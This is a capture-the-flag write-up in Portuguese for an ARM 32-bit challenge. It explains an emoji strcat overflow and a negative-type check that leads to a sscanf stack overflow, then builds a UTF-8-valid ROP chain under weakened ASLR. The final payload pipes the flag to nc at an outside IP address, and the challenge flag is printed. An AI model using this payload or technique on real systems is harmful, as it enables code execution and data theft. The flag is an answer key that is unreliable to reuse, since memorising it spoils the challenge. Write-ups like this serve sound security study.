## **Resolução**

![image](https://github.com/user-attachments/assets/9bf1a81f-9b96-4cf9-909a-05bcb3031b02)

O problema fornece a **_phantom processing platform_**, que é uma plataforma para relatar aparições de fantasmas. Ela consiste em dois componentes: um **sensor** e um **processador**. Ambos os binários são compilados para **ARM 32 bits** e estão sendo executados em um ambiente _buildroot_ personalizado.

O **sensor_arm** oferece os seguintes comandos ao usuário:

```c
1. Add Ghost Data
2. Show Ghost Data
3. Edit Ghost Data
4. Delete Ghost Data
5. Analyze Ghost Data
6. Switch Mode
7. Exit
```

Assim, o usuário pode adicionar, exibir, editar e deletar observações de fantasmas. Além disso, é possível realizar uma análise de todos os fantasmas inseridos e há uma opção para alternar entre o **modo moderno** (emojis) e o **modo legado** (texto).

**O objetivo é obter execução de código no processador para ler a flag.**

### **Visão Geral**

Para analisar os binários, o **`rootfs.cpio`** fornecido pode ser extraído com:

```shell
mkdir ./cpio_contents
pushd ./cpio_contents > /dev/null
cat ../rootfs.cpio | cpio -idmv
popd > /dev/null
```

Descompactando, temos os seguintes arquivos:

```
bin                   proc
dev                   processor_arm
etc                   root
flag                  rootfs.cpio
handle_connection.sh  run
init                  sbin
lib                   sensor_arm
lib32                 start.sh
linuxrc               sys
media                 tmp
mnt                   usr
opt                   var
```

Depois disso, vale a pena verificar como os binários são executados. O arquivo **`S99start`** é executado na inicialização:

```shell
#!/bin/sh

start() {
    echo 2 > /proc/sys/kernel/randomize_va_space
    echo 10 > /proc/sys/vm/mmap_rnd_bits
    chmod 0444 /flag
    passwd -l root
    
    mkdir -p /tmp/sockets
    chmod 0333  /tmp/sockets

    [ -x /start.sh ] || chmod +x /start.sh

    su -s /bin/sh -c 'cd / && exec /start.sh &' ctf
}

[...CUT...]
```

Essa linha é responsável por ativa completamente ASLR (inclui heap, stack, mmap, VDSO, etc.):

```shell
echo 2 > /proc/sys/kernel/randomize_va_space
```

E essa linha define **quantos bits de entropia)** (aleatoriedade) o kernel vai usar ao **escolher o endereço base** para regiões de memória mapeadas:

```shell
echo 10 > /proc/sys/vm/mmap_rnd_bits
```

Em seguida, o script **`start.sh`** é executado:

```shell
#!/bin/bash

SENSOR_PORT=1337

socat TCP-LISTEN:${SENSOR_PORT},reuseaddr,fork EXEC:"setsid ./handle_connection.sh"
```

Esse script usa **`socat`**(Socket CAT) para executar o script **`handle_connection.sh`**:

```shell
#!/bin/bash

socket_path=$(mktemp /tmp/sockets/socket_XXXXXX)

cleanup() {
    sleep 1
    kill -TERM -$$  2>/dev/null
    rm -f "$socket_path"  
}

enforce_timeout() {
    local timeout_seconds=20
    sleep $timeout_seconds
    cleanup
    kill -TERM -$$  
}

trap cleanup EXIT
enforce_timeout &
/processor_arm "$socket_path" > /dev/null 2>&1 &
sleep 0.1  
/sensor_arm "$socket_path"
```

Esse script, por fim, apenas inicia o **processador_arm** e o **sensor_arm** para que o usuário possa interagir.

### **Proteção**

Rodando **`checksec`** nos binários do **processador_arm** e **sensor_arm** mostra que ambos são compilados para ARM 32 bits, **little endian**, e **sem stack canary**. Isso já indica uma possível falha de **_buffer overflow_**. As outras proteções estão ativadas.

```shell
$ checksec processor_arm
[*] 'processor_arm'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
$ checksec sensor_arm  
[*] 'sensor_arm'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### **Vulnerabilidades**

Ao operar sobre observações de fantasmas, os dados são transmitidos com a seguinte **`struct`**(pacote de informações):

```c
typedef struct {
    uint32_t timestamp;                 
    float latitude;                     
    float longitude;                    
    char title[TITLE_LEN];              
    int8_t type;                         
    int8_t confidence;                   
    uint16_t id;                         
    char description[DESCRIPTION_SIZE];  
} GhostPacket;
```

O **`type`** pode ser um dos seguintes:

```c
typedef enum {
    ETHEREAL_VOYAGER = 0x00,  
    WHISPERING_SHADE = 0x01,  
    POLTERGEIST = 0x02,       
    WRAITH = 0x03,            
    SHADOW_FIGURE = 0x04,     
    REVENANT = 0x05,          
    SPECTRE = 0x06,           
    DOPPELGANGER = 0x07,      
    CUSTOM_GHOST = 0x08,      
} GhostType;
```

Ao selecionar os tipos 0-7, um "fantasma padrão" é adicionado com título e descrição aleatórios. Se o valor 8 for escolhido, o título e a descrição podem ser escolhidos livremente pelo usuário.

### **Bug 1**

Quando um fantasma é adicionado, um símbolo ou emoji é anexado ao título. Se o sensor estiver em "modo legado", um símbolo (`++, +, ~, -, --`) é adicionado. No "modo moderno", um emoji é adicionado.

Para isso, o sensor subtrai o tamanho do emoji do campo **`title`**:

```c
printf("Enter title of your ghost observation report: \n");
if (readInput(packet->title, TITLE_LEN-strlen(EMOJI_99)) <= 0) {
   printf("Failed to read title.\n");
   return -1;
}
```

O processador então **anexa** o emoji ou símbolo ao título com base no modo atual:

```c
#define EMOJI_99 "😁👻" // -> 09 Caracteres
#define EMOJI_75 "🤔👻" // -> 09 Caracteres
#define EMOJI_50 "😐👻" // -> 09 Caracteres
#define EMOJI_5 "😕👻"  // -> 09 Caracteres
#define EMOJI_0 "☹️👻"  // -> 11 Caracteres

[...CUT...]

void appendEmoji(GhostPacket* packet) {
    if (is_modern) {
        if (packet->confidence > 95) {
            strcat(packet->title, EMOJI_99);
        } else if (packet->confidence > 65) {
            strcat(packet->title, EMOJI_75);
        } else if (packet->confidence > 35) {
            strcat(packet->title, EMOJI_50);
        } else if (packet->confidence > 5) {
            strcat(packet->title, EMOJI_5);
        } else {
            strcat(packet->title, EMOJI_0);
        }
    } else {
        if (packet->confidence > 95) {
            strcat(packet->title, " ++");
        } else if (packet->confidence > 65) {
            strcat(packet->title, "  +");
        } else if (packet->confidence > 35) {
            strcat(packet->title, "  ~");
        } else if (packet->confidence > 5) {
            strcat(packet->title, "  -");
        } else {
            strcat(packet->title, " --");
        }
    }
}
```

O problema é que `EMOJI_0` tem 11 caracteres, enquanto todos os outros emojis têm apenas 9 caracteres. Portanto, ao operar no "**modo moderno**" com **confidence** menor que 5, o campo `title` transbordará 2 bytes para o campo `type`. A representação de bytes de `EMOJI_0` é `E2 98 B9 EF B8 8F F0 9F 91 BB` ou `-30 -104 -71 -17 -72 -113 -16 -97 -111 -69`. Portanto, ao transbordar, o tipo do fantasma será definido como `-69`.

### **Bug 2**

Isso nos leva ao segundo bug. Quando um fantasma padrão é criado no **sensor_arm**, ele receberá uma descrição e uma característica aleatória. Os dois valores são separados por um caractere **`~`**. O processador então usa **`sscanf`** para analisar a descrição e a característica em dois buffers, cada um com metade do tamanho da descrição inteira. Embora isso nunca seja um problema para um "fantasma padrão", se um invasor puder controlar a descrição, ele poderá criar um cenário de **_buffer overflow_**.

```c
void extractAndMatchTraits(const GhostPacket* packet, int traitOccurrences[NUM_DEFAULT_GHOSTS][TRAITS_PER_GHOST]) {
    char descriptionBeforeTrait[DESCRIPTION_SIZE / 2] = {0};
    char extractedTrait[DESCRIPTION_SIZE / 2] = {0};
    
    if (packet->type < CUSTOM_GHOST) {
        if (sscanf(packet->description, "%[^~] ~ %[^\n]", descriptionBeforeTrait, extractedTrait) == 2) {
            for (int h = 0; h < NUM_DEFAULT_GHOSTS; h++) {
                for (int j = 0; j < TRAITS_PER_GHOST; j++) {
                    if (strcmp(extractedTrait, ghostTraits[h][j]) == 0) {
                        traitOccurrences[h][j]++;
                        break;
                    }
                }
            }
        }
    }
}
```

Normalmente, apenas a `description` de "default ghosts" será passada para o `sscanf`. Mas a verificação `if (packet->type < CUSTOM_GHOST)` não considera valores negativos de `type` . Assim, um invasor pode usar o bug 1 para estourar o `type` para ser negativo (-69) e definir uma descrição longa para esse ghost. Como o `processador_arm` assume erroneamente que um índice negativo pertence a um "custom_ghost", ele analisará a descrição usando `sscanf`, que estoura um dos dois buffers de pilha.

### **Exploitation**


A exploração parece bem simples agora, mas há mais um problema. O processador valida cada `GhostPacket` que recebe:

```c
int validateGhostPacket(GhostPacket* newPacket) {
    if (newPacket->timestamp > time(NULL)) {
        return -1;
    }

    if (newPacket->latitude < -90.0 || newPacket->latitude > 90.0 ||
        newPacket->longitude < -180.0 || newPacket->longitude > 180.0) {
        return -1;
    }

    if (!isValidUtf8(newPacket->title)) {
        return -1;
    }

    if (newPacket->type > CUSTOM_GHOST) {
        return -1;
    }

    if (newPacket->confidence > 100) {
        return -1;
    }

    if (!isValidUtf8(newPacket->description)) {
        return -1;
    }

    return 0;
}
```

Importante para nós é a verificação da descrição. O processador garante que o campo de descrição contenha apenas caracteres UTF-8. Isso tornará a exploração muito mais complexa.

O processador é compilado com ASLR, mas lembramos do script **S99start**, que apenas 10 bits de aleatoriedade são definidos. Portanto, nenhum vazamento é necessário, mas uma força bruta `1/1024` pode ser usada em vez disso.

Ao tentar encontrar gadgets que sejam codificáveis ​​em UTF-8, é importante entender como o UTF-8 funciona. O intervalo UTF-8 de 1 byte é de `0x00-0x7f`. Isso provavelmente não será suficiente para codificar gadgets significativos. Mas também há caracteres UTF-8 de 2, 3 e 4 bytes. Eles permitem codificar de 1 a 2 bytes arbitrários, enquanto sobrepujam o próximo byte.

Existem várias maneiras de encontrar gadgets agora. Minha abordagem foi executar o ropper em `libc` para extrair todos os gadgets primeiro. Depois, escrevi um pequeno script gadget helper.py que adiciona todos os 1024 deslocamentos ASLR aos gadgets. Para cada deslocamento, ele verifica se cada gadget é codificável em UTF-8. Se for, ele grava os gadgets em um novo arquivo. Para reduzir o número de arquivos, excluí os deslocamentos ALSR, onde `system` não era codificável em UTF-8.

Então criei a seguinte cadeia de gadgets no deslocamento ALSR 32:

```python
SYSTEM  = 0x76abd258 #                                                            SYSTEM # 0x76eb0258 
JMP1    = 0x76afca50 #['0x76afca50', 'pop {r4, pc}; ldr r0, [r0, #0x64]; bx lr;']   JMP2 # 0x76ee0824
JMP2    = 0x76aed824 #['0x76aed824', 'add r0, sp, #0x10; blx r4;']                  JMP1 # 0x76ed3f0c
```

O gadget JMP2 permite mover o stackpointer sp para r0. O gadget JMP1 é usado para mover o endereço do sistema para r4. Em combinação, isso nos permitirá chamar system(<command on stack>).

O paylod final se parece com isso:

```python
payload  = b"A"*136 # buffer
payload += b"aaaa"  # r7
payload += p32(JMP1)
payload += p32(SYSTEM)
payload += p32(JMP2)
payload += b"B"*16
payload += b"cat /flag | nc 167.71.33.163 1"
```

  
Por fim, eu só tive que executar o exploit em um loop até que meu offset ASLR desejado aparecesse. Veja exploit.py para o script completo do exploit.

Dando a flag, **PCTF{C0ngratz_on_exp0sing_@ll_th3_phant0ms_bFKLgqJzh8sV4}**
